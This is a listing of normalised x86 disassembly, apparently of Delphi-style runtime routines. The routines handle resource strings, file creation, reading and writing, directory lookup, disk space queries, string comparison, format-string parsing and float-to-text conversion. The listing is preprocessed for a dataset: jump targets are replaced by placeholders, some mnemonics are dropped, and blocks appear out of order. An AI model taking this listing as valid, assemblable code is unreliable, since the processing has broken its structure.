add [ eax + eax ] al
add [ eax ] al
mov eax eax
push ebx
push esi
add esp 0xfffffc00
mov esi eax
mov ebx edx
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
call LoadStringA
mov ecx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_40406c
cmp [ ebx + 0x4 ] 0x0
sub_40859c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4048e8
xor eax eax
push ebp
push sub_408602
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
lea eax [ ebp - 0x4 ]
call sub_403f7c
lea edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405700
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403fd0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_408609
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4049b8
retn
sub_408624
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_40443c
push eax
call CreateFileA
sub_40867c
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_40443c
push eax
call CreateFileA
pop ebx
retn
sub_4086a8
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4086d4
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408700
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_408740
push ebp
mov ebp esp
add esp 0xfffffeb4
push ebx
mov ebx eax
lea eax [ ebp - 0x14c ]
push eax
mov eax ebx
call sub_40443c
push eax
call FindFirstFileA
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
call FindClose
test [ ebp - 0x14c ] 0x10
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x138 ]
push eax
call FileTimeToLocalFileTime
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call FileTimeToDosDateTime
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4087b8
push ebx
push esi
mov esi eax
mov eax esi
call sub_40423c
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40c508
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_4087e8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_40423c
mov edi eax
mov eax ebx
call sub_40443c
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_408b18
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40c508
cmp al 0x2
jne r-xdata
dec edi
sub_408838
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_4087e8
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_40449c
pop edi
pop esi
pop ebx
retn
sub_408870
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_4087e8
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_403f7c
cmp [ esi + ebx - 0x1 ] 0x2e
jne r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_40449c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4088b8
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_40443c
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_40406c
add esp 0x108
pop esi
pop ebx
retn
sub_4088f4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404da4
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404da4
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_4089a4
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_4089cc
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea eax [ edi - 0x1 ]
pop esi
pop edi
retn
sub_4089f8
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_408a2c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_40423c
push eax
mov eax ebx
call sub_40443c
mov edx eax
mov eax esi
pop ecx
call sub_4089f8
pop esi
pop ebx
retn
sub_408a50
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_40443c
mov edx eax
mov ecx edi
mov eax ebx
call sub_4089f8
pop edi
pop esi
pop ebx
retn
sub_408a70
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_408a94
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408ad4
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408b2c
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_408bb4
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_408968
mov esi eax
inc esi
mov eax esi
call sub_408b94
mov ecx esi
mov edx ebx
call sub_408994
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_408bf0
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40c52c
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_408994
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407df8
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_408c78
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_408fcf
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_408d5a
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408da2
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_408d5a
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_408c6c
pop edx
or edx edx
je r-xdata
sub_408d5a
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_408fcf
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408da2
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_408fcf
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_408bf0
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_408dc9 ]
mov ebx ecx
sub cl 0x44
je sub_4081dc
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_4041a4
jmp r-xdata
mov esi sub_404204
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_4081dc
sub cl 0x44
je sub_408170
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_408170
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_4081dc
mov ecx 0x10
cmp bl 0x58
je sub_408170
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_408c48
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_409188
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_408170
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_408ff0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408968
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_408c78
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_409030
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408968
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_408c78
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_409084
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_40423c
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_40423c
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_40423c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_408c78
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_40406c
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_403f7c
mov eax esi
mov edx ebx
call sub_4045c8
mov eax [ ebp - 0x4 ]
call sub_40423c
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_408c78
mov edx esi
xchg edx eax
call sub_4045c8
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_409144
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_409188
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_40945c
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_409287
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_409291
call sub_409287
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_409144
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_4092ed
call sub_409287
call sub_40927e
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_40927e
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_409144
retn
xor ecx ecx
sub_409329
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_40927e
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_40927e
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_40938e
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_4093e2
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_409329
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_40945c
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_409489
jmp r-xdata
call sub_4095ab
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_409489
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402d38
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_4095ab
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_409688
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_40973f
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_40974a
neg edx
mov ecx esi
call sub_40974a
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_40973f
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_409766
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
